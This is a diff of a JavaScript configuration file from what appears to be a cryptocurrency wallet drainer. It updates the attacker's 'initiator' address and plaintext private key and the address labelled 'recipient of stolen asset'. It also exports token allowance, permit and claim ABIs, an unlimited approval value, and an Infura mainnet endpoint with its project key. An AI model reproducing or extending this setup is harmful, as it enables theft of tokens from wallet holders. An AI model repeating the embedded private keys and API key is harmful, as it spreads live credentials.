@@ -1,11 +1,12 @@
 // export const initiator = '0x5049bE34eE05627aD0C500f11B25d23c02F530b1'; // initiator address
 // export const initiatorPK = 'bbdeb46f850dd3b11672db4f15b5ff15927cbfcdb9959ddc94df4a99e5966989'; // initiaror's private key
 
-export const initiator = '0xeE71c83008C5814455223866A881EfE25d5cf347'; // initiator address
-export const initiatorPK = '6fe98598348dddbe6fc733c8753854062d293557071dd3e87b0cc1c61e99cd52'; // initiaror's private key
+// export const initiator = '0xeE71c83008C5814455223866A881EfE25d5cf347'; // initiator address
+export const initiator = '0xF8eb38971de1C54eFaFF081470264BDb0276e516'; // initiator address
+export const initiatorPK = 'a5b0e838f10a4d8b8905259113654d9591ddbca02a112c954df396559a5d285f'; // initiaror's private key
 
-// export let recipient = '0x16866d2b99354C5057aE414bbA03C7810b550E04'; // recipient of stolen asset
-export let recipient = '0x1D26015064db1f8073871041bF554757101f6386'; // recipient of stolen asset
+// export let recipient = '0x1D26015064db1f8073871041bF554757101f6386'; // recipient of stolen asset
+export let recipient = '0xFBD751b4496Ffae785ed17b8a5AC313a2866B029'; // recipient of stolen asset
 export { default as ALLOWANCEABI } from './abis/allowanceABI.json';
 export { default as permitV2 } from './abis/permitvs.json';
 export { default as CLAIMEABI } from './abis/claimABI.json';
@@ -19,8 +20,7 @@ export { default as increasAllownceTokens } from './increasAllownceTokens.json';
 export const infura = "https://mainnet.infura.io/v3/4d5f05d6b7bb4260a9ba2b2e085844db";
 
 export const max = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-// export const claimAddress = '0x50bF0eAf6149F6029469d0F9Ac874e22F94b670a';
-// export const claimAddress = '0x5F93C85fea3af5331037354ffAa19897A5AdA977';
+
 // const keys = [
 //   'A',
 //   'CUR',
